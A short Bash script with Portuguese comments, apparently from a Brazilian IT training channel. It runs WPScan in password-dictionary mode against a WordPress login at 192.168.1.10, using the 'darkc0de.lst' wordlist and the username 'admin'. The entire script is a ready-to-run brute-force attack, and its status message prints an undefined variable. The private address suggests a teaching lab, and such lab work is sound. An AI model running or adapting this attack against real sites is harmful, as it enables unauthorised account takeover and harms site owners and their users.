#!/bin/bash
# Autor: Robson Vaamonde
# Site: www.procedimentosemti.com.br
# Facebook: facebook.com/ProcedimentosEmTI
# Facebook: facebook.com/BoraParaPratica
# YouTube: youtube.com/BoraParaPratica
# Data de criação: 31/10/2016
# Data de atualização: 31/10/2016
# Versão: 1.0

#Variável do comando WPScan
IP_URL="192.168.1.10"
WORDLIST="darkc0de.lst"
USERNAME="admin"

#Executando o comando WPScan com as opções: --url=Indica o IP ou URL do alvo, --wordlist=Indica o arquivo de Dicionário de Senhas e --username=Indica o usuário a ser utilziado para autenticação
echo -e "Executando o comando WPScan no alvo: $ALVO"
echo
  wpscan --url $IP_URL --wordlist $WORDLIST --username $USERNAME
echo
echo -e "Fim da execução `date`"
